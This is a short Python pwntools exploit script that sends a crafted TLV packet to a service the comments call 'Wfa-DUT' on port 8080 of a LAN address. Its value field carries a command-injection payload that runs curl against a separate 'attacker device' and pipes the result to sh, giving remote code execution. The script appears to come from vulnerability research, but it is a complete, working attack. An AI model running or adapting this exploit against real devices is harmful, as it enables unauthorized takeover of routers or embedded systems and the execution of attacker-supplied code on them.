from pwn import *
import time

def create_tlv_packet(tag, value):
    """
    Create a TLV packet with a given tag and value.
    Tag is expected to be an integer, and value a byte string.
    """
    tag_bytes = p16(tag)
    length_bytes = p16(len(value))
    tlv_packet = tag_bytes + length_bytes + value
    return tlv_packet

def send_tlv_packet(ip, port, packet):
    """
    Send a TLV packet to the specified IP and port.
    Returns the response received.
    """
    conn = remote(ip, port)
    sent = time.time()

    conn.send(packet)
    response = conn.recv(8192)

    recv = time.time()
    print(f"response received in {recv-sent} seconds") #Added during testing to check RCE with sleep

    conn.close()
    
    return response

if __name__ == "__main__":
    target_ip = '192.168.1.1'
    target_port = 8080 # Port running Wfa-DUT
    tag = 2
    value = b'$(sh -c "$(curl 192.168.1.247:4)")111111' #Local ip of the attacker device (payload must be less than 40 bytes)
    packet = create_tlv_packet(tag, value)
    
    response = send_tlv_packet(target_ip, target_port, packet)
    
    print("Received response:", response)
